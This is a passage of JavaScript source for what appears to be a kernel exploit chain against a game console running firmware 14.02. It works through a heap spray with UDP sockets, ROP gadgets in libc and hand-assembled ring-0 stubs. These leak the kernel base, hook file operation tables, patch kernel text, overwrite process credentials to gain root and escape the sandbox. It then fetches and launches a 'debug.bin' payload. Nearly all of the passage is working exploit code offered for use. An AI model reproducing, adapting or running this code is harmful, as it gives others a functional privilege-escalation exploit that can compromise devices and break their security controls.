  mask.u8.fill(0);
  mask.u8[core >> 3] = 1 << (core & 7);
  rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
}

const PADDING = 0x0b3a300;
const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
const RET0 = 0x00c3c031;

function rehangRing0(k, room, ofs, list, from, copy) {
  if (!list.length || list.length > 256 || !from) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49b9").qw(from);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
  c.hex("4d895308").hex("ffc0").hex("ebda");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function countOffRing0(k, room, ofs, list, copy) {
  if (!list.length || list.length > 256) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("741d").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("7406").hex("4d395308").hex("74e2");
  c.hex("ffc0").hex("ebde");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function teardown(k, kbase, ofs, devs, queues, room) {
  const kat = function (rva) { return plus(kbase, rva); };
  const fileOf = function (fd) { return k.read_v(plus(ofs, fd * 8)); };

  const stub = kat(PADDING + OFF_STUB);
  const dtab = kat(PADDING + OFF_DEVS);
  const qtab = kat(PADDING + OFF_QUEUES);

  say("[t] reading the padding at " + text(stub));
  const there = k.read_v(stub);
  if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
  say("[t] it holds " + text(there));
  if (isZero(there)) {
    if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
    const back = k.read_v(stub);
    if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
  } else {
    say("[t] something else is at " + text(stub) + ": " + text(there)); return false;
  }

  const clone = function (from, to, what) {
    const prior = k.read(to, 0x58);
    let clean = !!prior;
    if (prior) for (let i = 0; i < prior.length; i++) if (prior[i] !== 0) clean = false;
    if (!clean) {
      say("[t] " + what + " destination is not pristine"); return false;
    }
    for (let i = 0; i <= 10; i++) {
      let q = k.read_v(plus(from, i * 8));
      if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
      if (i === 7) q = stub;
      if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
    }
    for (let i = 0; i <= 10; i++) {
      const original = k.read_v(plus(from, i * 8));
      const copied = k.read_v(plus(to, i * 8));
      if (!original || !copied ||
          !same(copied, i === 7 ? stub : original)) {
        say("[t] " + what + " copy mismatch at +0x" + (i * 8).toString(16));
        return false;
      }
    }
    return true;
  };

  const original = function (list, copy) {
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      if (f && inHeap(f)) {
        const cur = k.read_v(plus(f, 0x08));
        if (cur && inText(cur) && !same(cur, copy)) return cur;
      }
    }
    return null;
  };
  const ready = function (copy) {
    const c = k.read_v(plus(copy, 0x38));
    return c !== null && same(c, stub);
  };
  const rehang = function (list, from, copy) {
    let moved = 0;
    for (let i = 0; i < list.length; i++) {
      const f = fileOf(list[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (cur && same(cur, copy)) moved++;
      else if (cur && from && same(cur, from) && k.write_v(plus(f, 0x08), copy)) moved++;
    }
    return moved;
  };

  say("[t] looking for the device table across " + devs.length + " handles");
  const devOps = original(devs, dtab);
  if (devOps) {
    if (!ready(dtab) && !clone(devOps, dtab, "device table")) return false;
  } else if (!ready(dtab)) {
    say("[t] no device table to copy -- nothing done"); return false;
  }
  let moved = rehangRing0(k, room, ofs, devs, devOps, dtab);
  if (moved === null) { say("[t] rehanging one at a time"); moved = rehang(devs, devOps, dtab); }
  say("[t] " + moved + " of " + devs.length + " handles on the copy");

  let movedq = 0;
  if (queues && queues.length) {
    const qOps = original(queues, qtab);
    if (qOps && !same(qOps, devOps || qtab)) {
      if (ready(qtab) || clone(qOps, qtab, "queue table")) movedq = rehang(queues, qOps, qtab);
    } else if (ready(qtab)) movedq = queues.length;
  }
  say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");

  let notes = 0;
  for (let i = 0; queues && i < queues.length; i++) {
    const f = fileOf(queues[i]);
    if (!f || !inHeap(f)) continue;
    const kq = k.read_v(f);
    if (!kq || !inHeap(kq)) continue;
    const w = k.read_v(plus(kq, 0xa0));
    if (!w) continue;
    if ((w.hi >>> 0) !== 0) k.write_v(plus(kq, 0xa0), v(w.low, 0));
    const cleared = k.read_v(plus(kq, 0xa0));
    if (cleared && (cleared.hi >>> 0) === 0 &&
        (cleared.low >>> 0) === (w.low >>> 0)) notes++;
  }
  say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");

  let left = countOffRing0(k, room, ofs, devs, dtab);
  if (left === null) {
    left = 0;
    for (let i = 0; i < devs.length; i++) {
      const f = fileOf(devs[i]);
      const cur = (f && inHeap(f)) ? k.read_v(plus(f, 0x08)) : null;
      if (!(cur && same(cur, dtab))) left++;
    }
  }
  let queueLeft = 0;
  for (let i = 0; queues && i < queues.length; i++) {
    const f = fileOf(queues[i]);
    const cur = f && inHeap(f) ? k.read_v(plus(f, 0x08)) : null;
    if (!cur || !same(cur, qtab)) queueLeft++;
  }
  const queueCount = queues ? queues.length : 0;
  const safe = devs.length > 0 && left === 0 && moved > 0 &&
    movedq === queueCount && queueLeft === 0 && notes === queueCount &&
    ready(dtab) && (queueCount === 0 || ready(qtab));
  if (safe) {
    say("[t] verified all " + devs.length + " device handles and " +
      queueCount + " queue handles/notes defused");
    return true;
  }
  say("[t] incomplete teardown: devices left=" + left + " queues left=" +
      queueLeft + " moved=" + movedq + "/" + queueCount +
      " notes=" + notes + "/" + queueCount + "; cold power off");
  return false;
}

export function probeAfterglow(ctx) {
  STATE.ctx = ctx;
  const out = { ok: false, reasons: [] };
  const no = function (why) { out.reasons.push(why); };

  const noStub = seedStubs();
  out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
  if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) {
    const m = findLibByShape();
    if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
    else say("AG libc: " + m.note + " | entries=" + m.entries
             + " first=[" + m.first.join(" ") + "]");
  }
  const libc = lib.base;
  out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
  out.modules = lib.count;
  if (!libc) {
    no(lib.note || "libSceLibcInternal is not mapped");
    say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
        + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
    return out;
  }

  let missing = null;
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
  }
  out.gadgets = missing ? ("missing " + missing) : "all present";
  if (missing) no("gadget " + missing + " is missing -- different libc build");

  let dirty = 0;
  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
  }
  out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
  if (dirty) no("the spare room behind libc is occupied");

  let node = null;
  for (let i = 0; i < PROBE_NODES.length; i++) {
    const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (fd >= 0) { node = PROBE_NODES[i]; break; }
  }
  out.probeNode = node;
  if (!node) no("no usable device node for the probe descriptor");

  const held = [];
  for (let i = 0; i < 20; i++) {
    const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
    if (fd < 0) break;
    held.push(fd);
  }
  out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
  if (!held.length) no("/dev/apm cannot be opened in this sandbox");

  const open = [], refused = [];
  for (let u = 0; u < 32; u++) {
    const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
    if (fd >= 0) { open.push(u); sc(S.close, fd); }
    else if (refused.length < 3) refused.push(u + ":e" + host().errno());
  }
  out.units = open.length;
  out.unitList = open.length ? open.join(",") : "none";
  out.unitRefused = refused.join(" ") || "-";
  if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");

  const pin = pinCore();
  out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
  if (!pin.ok) no("cannot pin to a cpu: " + pin.note);

  const socks = [];
  for (let i = 0; i < TUNE.sprays; i++) {
    const fd = sc(S.socket, 2, 2, 0).i32;
    if (fd < 0) break;
    socks.push(fd);
  }
  out.udp = socks.length;

  if (socks.length) {
    const body = alloc(TUNE.object); body.u8.fill(0);
    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    pokeAt(req, 8, alloc(16).at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);
    const stub = stubFor(S.setsockopt);
    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
    let t0, t1;
    if (nb) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      const fertig = [];
      for (let i = 0; i < calls.length; i += nb) {
        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
        catch (e) { fertig.length = 0; break; }
      }
      if (fertig.length) {
        host().runPrepared(fertig[0]);
        t0 = performance.now();
        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
        t1 = performance.now();
        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
      }
    }
    if (out.window === undefined) {
      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
    }
  } else out.window = "not measured";

  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
  if (socks.length < TUNE.sprays) {
    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
  }

  out.ok = out.reasons.length === 0;
  say("probe libc   " + out.libc);
  say("probe gadget " + out.gadgets + ", tail " + out.tail);
  say("probe apm    " + out.apm + ", node " + out.probeNode);
  say("probe units  " + out.units + " open: " + out.unitList);
  say("probe refused " + out.unitRefused);
  say("probe pin    " + out.pin);
  say("probe window " + out.window);
  say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
  say("probe SHOTS  " + out.units + " units, a run needs 3");
  if (out.ok) say("probe VERDICT usable");
  else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
  return out;
}

async function attempt(ctx, opts) {
  STATE.ctx = ctx;
  opts = opts || {};
  STATE.retry = false;
  if (!CANDIDATE_READY) {
    say("[p] corrected debug.bin launch paused pending host review");
    return false;
  }
  if (ctx.firmware !== "14.02") {
    say("debug.bin one-shot is restricted to firmware 14.02");
    return false;
  }
  say("afterglow -- one 14.02 attempt to start corrected GitHub debug.bin");
  const debugBytes = await fetchBytes("debug-1402-fixed.bin", "p");
  if (!debugBytes || debugBytes.length !== DEBUG_BIN.length ||
      sha256Hex(debugBytes) !== DEBUG_BIN.sha256) {
    say("[p] corrected debug.bin SHA-256 or length mismatch -- no kernel shot fired");
    return false;
  }
  say("[p] corrected GitHub debug.bin SHA-256 verified before kernel stage");

  const missing = seedStubs();
  if (missing.length) {
    say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
    return false;
  }
  STATE.pthread = resolvePthreadCreate();
  if (!STATE.pthread) {
    say("[p] pthread_create could not be resolved from the exact libkernel module; no kernel shot fired");
    return false;
  }

  const pin = pinCore();
  if (!pin.ok) {
    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
    say("  Unpinned, the free and the refill land in different per cpu buckets,");
    say("  the hole is filled by somebody else, and ring 0 continues on that");
    say("  stranger's stack pointer. That is a dead console, not a bad run.");
    return false;
  }
  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");

  {
    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
    if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
      say("  this kernel is already open -- a run has succeeded on this boot.");
      say("  Not firing again; reboot the console for a fresh one.");
      return false;
    }
  }

  let lib = findLib("libSceLibcInternal.sprx");
  if (!lib.base) lib = findLibByShape();
  const libc = lib.base;
  if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }
  const shape = findLibByShape();
  if (!shape.base || !same(shape.base, libc) || !MAPS || !MAPS.length) {
    say("  live userland map listing did not confirm libc or map order");
    return false;
  }

  const gad = {};
  for (const name in GADGETS) {
    const want = unhex(GADGETS[name][1]);
    const at = plus(libc, GADGETS[name][0]);
    if (!sameBytes(rdbuf(at, want.length), want)) {
      say("  gadget " + name + " is missing -- this is not the libc build we know");
      return false;
    }
    gad[name] = at;
  }

  const shot = shooter(gad);
  const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);

  let kbase = null;
  const header = alloc(0x200), headerRef = alloc(16);
  {
    const win = alloc(TUNE.window + 16);
    wipe(win, TUNE.window + 16);

    if (!await checkpoint("leak-armed", "first kernel read shot")) {
      say("[1] PC collector did not acknowledge the shot"); return false;
    }
    const r = shot.take(function (c) {
      c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
      c.grab(win.at, TUNE.window);
    });

    if (!ran(r)) { say("[1] kernel leak shot missed; power off before another attempt"); return false; }
    const base = deriveBaseFromLeak(win.u8.subarray(0, TUNE.window), K.anchor);
    if (!base) { say("[1] two independent kernel base checks did not agree"); return false; }
    kbase = v(base.low, base.hi);
    say("[1] checked kernel base " + text(kbase));

    wipe(header, 0x200);
    pokeAt(headerRef, 0, kbase);
  }

  {
    const SCAN_WIN = 0x1000;
    const SCAN_PRE = K.swap_rbp - 0xa80d68;
    const scanBuf = alloc(SCAN_WIN + 16);
    wipe(scanBuf, SCAN_WIN + 16);
    const scanRef = alloc(16);
    pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));
    const stockSpecs = PATCH_WINDOWS.concat(BOOTSTRAP_WINDOWS);
    const stockRefs = [], stockOut = [];
    for (const spec of stockSpecs) {
      const ref = alloc(16), out = alloc(8);
      pokeAt(ref, 0, plus(kbase, spec[0])); wipe(out, 8);
      stockRefs.push(ref); stockOut.push(out);
    }
    const sysentRef = alloc(16), sysentOut = alloc(0x30);
    pokeAt(sysentRef, 0, plus(kbase, 0x1102d80)); wipe(sysentOut, 0x30);
    const gsRef = alloc(16), gsOut = alloc(11);
    pokeAt(gsRef, 0, plus(kbase, 0x74de23)); wipe(gsOut, 11);

    if (!await checkpoint("preflight-armed", "gadget and exact stock window read")) {
      say("[1b] PC collector did not acknowledge the shot"); return false;
    }
    const scanR = shot.take(function (c) {
      c.load_rax(headerRef.at);
      c.grab(header.at, 0x200);
      c.load_rax(scanRef.at);
      c.grab(scanBuf.at, SCAN_WIN);
      for (let i = 0; i < stockRefs.length; i++) {
        c.load_rax(stockRefs[i].at);
        c.grab(stockOut[i].at, 8);
      }
      c.load_rax(sysentRef.at);
      c.grab(sysentOut.at, 0x30);
      c.load_rax(gsRef.at);
      c.grab(gsOut.at, 11);
    }, 0x1000);

    say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));

    if (ran(scanR)) {
      if (!validateKernelHeader(header.u8,
          { low: kbase.low >>> 0, hi: kbase.hi >>> 0 })) {
        say("[1a] live 14.02 ELF text layout failed validation");
        return false;
      }
      say("[1a] live 14.02 ELF text layout verified");
      const sb = rdbuf(scanBuf.at, SCAN_WIN);
      const hits = [];
      for (let i = 0; i < SCAN_WIN - 2; i++) {
        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) hits.push(i);
      }
      if (hits.length !== 1 || 0xa80d68 + hits[0] !== 0xa81478) {
        say("[1b] unique verified 14.02 swap gadget absent -- stopping");
        return false;
      }
      say("[1b] unique 14.02 swap gadget verified at 0xa81478");
    } else {
      say("[1b] gadget scan shot missed -- stopping");
      return false;
    }
    for (let i = 0; i < stockSpecs.length; i++) {
      if (!sameBytes(stockOut[i].u8, unhex(stockSpecs[i][1]))) {
        say("[1c] stock kernel window mismatch at 0x" + stockSpecs[i][0].toString(16));
        return false;
      }
    }
    const sd = sysentOut.dv;
    const sycall = qAt(sysentOut, 8);
    if (sd.getUint32(0, true) !== 0 || sd.getUint32(4, true) !== 0 ||
        !same(sycall, plus(kbase, 0x1c07a0)) || sd.getUint32(0x10, true) !== 0 ||
        sd.getUint32(0x14, true) !== 0 || sd.getUint32(0x18, true) !== 0 ||
        sd.getUint32(0x1c, true) !== 0 || sd.getUint32(0x20, true) !== 0 ||
        sd.getUint32(0x24, true) !== 0 || sd.getUint32(0x28, true) !== 0 ||
        sd.getUint32(0x2c, true) !== 4) {
      say("[1c] stock sysent[11] differs from the 14.02 preimage");
      return false;
    }
    say("[1c] 22 exact host and bootstrap windows plus sysent[11] verified");
    if (!sameBytes(gsOut.u8, unhex("65488b0425000000005dc3"))) {
      say("[1c] GS thread gadget differs from the 14.02 preimage");
      return false;
    }
    say("[1c] GS thread gadget verified");
  }

  const kat = function (rva) { return plus(kbase, rva); };

  let probe = -1, node = null;
  for (let i = 0; i < PROBE_NODES.length && probe < 0; i++) {
    probe = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
    if (probe >= 0) node = PROBE_NODES[i];
  }
  if (probe < 0) { say("[2] no device node opened for the probe descriptor"); return false; }

  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
    if (rd4(plus(hostFree, off)) !== 0) {
      say("[2] the spare room behind libc is occupied -- nothing written");
      return false;
    }
  }
  say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
      + " bytes of spare room behind libc");

  let reach = null;
  if (MAPS) {
    for (let i = 0; i < MAPS.length; i++) {
      const a0 = MAPS[i][0], b0 = MAPS[i][1];
      const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
      const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
      if (above && below) { reach = i + 2; break; }
    }
  }
  if (!reach || reach > 192 ||
      shot.fired + 7 + Math.ceil(reach / 48) + 2 > TUNE.units) {
    say("[3a] mapped host page exceeds the one-shot read and FD budget");
    return false;
  }
  say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
      + (MAPS ? (", " + MAPS.length + " mapped") : ""));

  const captured = await captureHostState(shot, kbase, probe, reach, hostPage);
  if (!captured) return false;
  const { file, ops, ftab, maps, hit, here } = captured;

  const rights = maps.dv.getUint32(hit * TUNE.stride + 0x5c, true);
  const locked = maps.dv.getUint32(hit * TUNE.stride + 0x88, true);
  const now = rights % 256, ceiling = Math.floor(rights / 256) % 256;

  say("[4] mapping " + hit + " at " + text(here) + " rights=0x" + now.toString(16)
      + " ceiling=0x" + ceiling.toString(16));
  if (locked % 2 === 1 || !inHeap(here) || (here.low & 7) !== 0 ||
      now !== 5 || ceiling !== 5) {
    say("    not the mapping we want -- nothing written"); return false;
  }

  const guardRightsRef = alloc(16), guardOpsRef = alloc(16);
  const guardRightsOut = alloc(4), guardOpsOut = alloc(8);
  pokeAt(guardRightsRef, 0, plus(here, 0x5c));
  pokeAt(guardOpsRef, 0, plus(file, 8));
  wipe(guardRightsOut, 4); wipe(guardOpsOut, 8);
  if (!await checkpoint("writer-guard-armed", "re-read VM rights and probe f_ops")) {
    say("[4] PC collector did not acknowledge the write guard"); return false;
  }
  const guardShot = shot.take(function (c) {
    c.load_rax(guardRightsRef.at); c.grab(guardRightsOut.at, 4);
    c.load_rax(guardOpsRef.at); c.grab(guardOpsOut.at, 8);
  });
  if (!ran(guardShot) || guardRightsOut.dv.getUint32(0, true) !== rights ||
      !same(qAt(guardOpsOut, 0), ops)) {
    say("[4] live write targets changed; no kernel write attempted"); return false;
  }

  let widened = rights;
  if (Math.floor(widened / 0x200) % 2 === 0) widened += 0x200;

  const wRights = alloc(16); wRights.dv.setUint32(0, widened >>> 0, true);
  const wTable = alloc(16); pokeAt(wTable, 0, ftab.at);
  pokeAt(ftab, 0x18, hostFree);

  if (!await checkpoint("writer-armed", "first kernel writes: VM rights and probe f_ops")) {
    say("[5] PC collector did not acknowledge the writer"); return false;
  }
  const r3 = shot.take(function (c) {
    c.put(plus(here, 0x5c), wRights.at, 4);
    c.put(plus(file, 0x08), wTable.at, 8);
  });
  say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
  if (!ran(r3)) {
    say("[5] writer did not return; kernel state is unknown. Keep page open and cold power off");
    return false;
  }

  if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
    say("[5] page did not turn writable; file hook may remain. Cold power off"); return false;
  }
  const boot = unhex(BOOTSTRAP);

  wrbuf(hostFree, boot);
  if (!sameBytes(rdbuf(hostFree, boot.length), boot)) {
    say("[5] bootstrap copy failed; file hook may remain. Cold power off"); return false;
  }

  const m1 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const m1Good = m1.i32 !== -1 && (m1.hi >>> 0) !== 0;
  const before = m1Good ? sc(S.mprotect, v(m1.lo, m1.hi), 0x4000, 7).i32 : -1;
  if (!await checkpoint("bootstrap-armed", "ioctl will invoke the verified 14.02 bootstrap"))
    say("[5] PC collector did not acknowledge bootstrap; restoring hook remains essential");
  const ioctlRv = sc(S.ioctl, probe,
    0xC0000000 + (8 * 0x10000) + (97 * 0x100) + 1, alloc(64).at).i32;
  const ioctlErrno = ioctlRv === 0 ? 0 : host().errno();
  const m2 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
  const m2Good = m2.i32 !== -1 && (m2.hi >>> 0) !== 0;
  const after = m2Good ? sc(S.mprotect, v(m2.lo, m2.hi), 0x4000, 7).i32 : -1;
  say("[6] bootstrap ioctl=" + ioctlRv + " errno=" + ioctlErrno +
      " rwx before=" + before + " after=" + after);
  await checkpoint("bootstrap-returned", "ioctl=" + ioctlRv + " rwx=" + before + "/" + after);

  const k = openRing0(hostFree);
  const thread = (before !== 0 && after === 0) ? k.thread() : null;
  const gated = thread !== null && inHeap(thread);

  if (!gated) {
    say("[6] gate unavailable; probe cannot be safely closed. Keep page open and cold power off");
    return false;
  }
  await checkpoint("restore-armed", "restoring original probe f_ops pointer");
  const restoreWritten = k.write_v(plus(file, 0x08), ops);
  const restoredOps = restoreWritten ? k.read_v(plus(file, 0x08)) : null;
  if (!restoredOps || !same(restoredOps, ops)) {
    say("[6] probe f_ops was not verified restored. Keep page open and cold power off");
    return false;
  }
  const probeClose = sc(S.close, probe).i32;
  if (probeClose !== 0) {
    say("[6] probe close failed; cold power off after this page");
    return false;
  }
  await checkpoint("restore-complete", "probe f_ops restored and descriptor closed");

  if (ioctlRv !== 0 || !m1Good || !m2Good || before === 0 || after !== 0) {
    say("[6] bootstrap result failed, rwx " + before + " before and " + after + " after -- "
        + shot.fired + " shots used");
    return false;
  }
  say("[6] kernel patched, rwx is open -- " + shot.fired + " shots used");

  const base2 = k.base();
  if (!base2 || !same(base2, kbase)) {
    say("[7] the gate reports " + (base2 ? text(base2) : "nothing")
        + ", the leak said " + text(kbase));
    return false;
  }
  say("[7] gate is live, thread " + text(thread));

  const failOut = function (why) {
    say(why);
    try {
      const p0 = k.read_v(plus(thread, 0x08));
      const f0 = p0 && k.read_v(plus(p0, 0x48));
      const o0 = f0 && k.read_v(f0);
      if (o0 && inHeap(o0)
          && teardown(k, kbase, o0, shot.devs, shot.queues, hostFree))
        say("handles defused after the failure -- this page may close");
      else
        say("the handles are NOT defused -- do not close this page, cold boot instead");
    } catch (e) {
      say("teardown threw: " + ((e && e.message) || e));
    }
    return false;
  };

  for (const spec of PATCH_WINDOWS) {
    const stock = unhex(spec[1]);
    const got = k.read(kat(spec[0]), stock.length);
    if (!got || !sameBytes(got, stock))
      return failOut("[7b] exact 14.02 stock window changed at 0x" +
        spec[0].toString(16) + " -- no host patch written");
  }
  say("[7b] all 15 exact 14.02 host patch windows still stock");

  if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
  let done = 0, failed = null;
  for (let i = 0; i < PATCHES.length; i++) {
    const bytes = unhex(PATCHES[i][1]);
    const got = k.read(kat(PATCHES[i][0]), bytes.length);
    if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
  }
  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
      + (failed ? (" -- first missing: " + failed) : ""));
  if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }

  const proc = k.read_v(plus(thread, 0x08));
  const fdt = proc && k.read_v(plus(proc, 0x48));
  const ofs = fdt && k.read_v(fdt);
  if (!ofs || !inHeap(ofs)) { return failOut("[9] descriptor table unreadable"); }

  const ucred = proc && k.read_v(plus(proc, 0x40));
  if (!ucred || !inHeap(ucred)) { return failOut("[9] no credentials"); }

  const prison0 = k.read_v(kat(K.prison0));
  const rootvnode = k.read_v(kat(K.rootvnode));
  if (!prison0 || !inText(prison0) ||
      !rootvnode || !inHeap(rootvnode))
    return failOut("[9] prison0 or rootvnode failed validation before credential writes");

  const z4 = new Uint8Array([0, 0, 0, 0]);
  const offs = [0x04, 0x08, 0x0c, 0x14];
  for (let i = 0; i < offs.length; i++)
    if (!k.write(plus(ucred, offs[i]), z4))
      return failOut("[9] credential group write failed");
  if (!k.write(plus(ucred, 0x10), new Uint8Array([1, 0, 0, 0])) ||
      !k.write_v(plus(ucred, 0x30), prison0))
    return failOut("[9] credential root or prison write failed");
  const caps = new Uint8Array(16); caps.fill(0xff);
  if (!k.write(plus(ucred, 0x60), caps) ||
      !k.write_v(plus(fdt, 0x10), rootvnode) ||
      !k.write_v(plus(fdt, 0x18), rootvnode))
    return failOut("[9] capability or root directory write failed");

  if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
  say("[9] jailbroken, uid 0");

  const iface = {
    base: kbase,
    curproc: proc,
    curproc_fd: fdt,
    curproc_ofiles: ofs,
    thread: thread,
    read: function (at, len) {
      const out = new Uint8Array(len);
      let got = 0;
      while (got < len) {
        const n = Math.min(len - got, STAGE_MAX);
        const s = k.read(plus(at, got), n);
        if (!s) return null;
        out.set(s, got); got += n;
      }
      return out;
    },
    write: function (at, bytes) {
      let done2 = 0;
      while (done2 < bytes.length) {
        const n = Math.min(bytes.length - done2, STAGE_MAX);
        if (!k.write(plus(at, done2), bytes.subarray(done2, done2 + n))) return false;
        done2 += n;
      }
      return true;
    },
    read8: function (at) { return k.read_v(at); },
    write8: function (at, q) { return k.write_v(at, q); },
    data_base: kbase,
  };

  iface.devs = shot.devs;
  iface.queues = shot.queues;
  if (ctx.state) ctx.state.afterglow = iface;

  say("[10] kernel interface is live -- " + shot.devs.length + " handles held open");

  iface.defused = teardown(k, kbase, ofs, shot.devs, shot.queues, hostFree);
  say(iface.defused
      ? "handles defused -- this page may close"
      : "the handles are NOT defused -- do not let this page close");
  if (!iface.defused) {
    iface.payload = false;
    say("[p] payload held: handles remain armed. Keep page open and cold power off");
    return iface;
  }

  /* Debug-menu heuristic writes removed; debug.bin handles its own runtime. */

  /* ---- Load debug.bin payload ---- */
  say("[p] Attempting to start corrected debug.bin as a thread");
  try {
    iface.payload = await loadPayload("debug-1402-fixed.bin", debugBytes);
    if (iface.payload) {
      say("[p] pthread_create returned success; HEN runtime remains unconfirmed");
    } else {
      say("[p] corrected debug.bin thread did not start");
    }
  } catch (e) {
    iface.payload = false;
    say("[p] Error starting corrected debug.bin: " + (e && e.message));
  }

  say("[p] one-shot finished; kernel patches " + done + "/" + PATCHES.length +
      "; pthread start=" + !!iface.payload + "; HEN status unconfirmed");
  return iface;
}

/* ------------------------------------------------------- Payload Loader */

async function fetchBytes(url, tag) {
  try {
    const r = await fetch(url + (url.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now());
    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
    return new Uint8Array(await r.arrayBuffer());
  } catch (e) {
    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
    return null;
  }
}

function resolvePthreadCreate() {
  const c = host();
  if (!c.libkernelBase) return null;
  const ids = alloc(4 * 0x300), count = alloc(8), info = alloc(0x160);
  wipe(ids, ids.u8.length); wipe(count, 8);
  if (sc(S.dynlib_get_list, ids.at, 0x300, count.at).i32 !== 0) return null;
  const n = count.dv.getUint32(0, true);
  if (n === 0 || n > 0x300) return null;
  for (let i = 0; i < n; i++) {
    wipe(info, 0x160); info.dv.setUint32(0, 0x160, true);
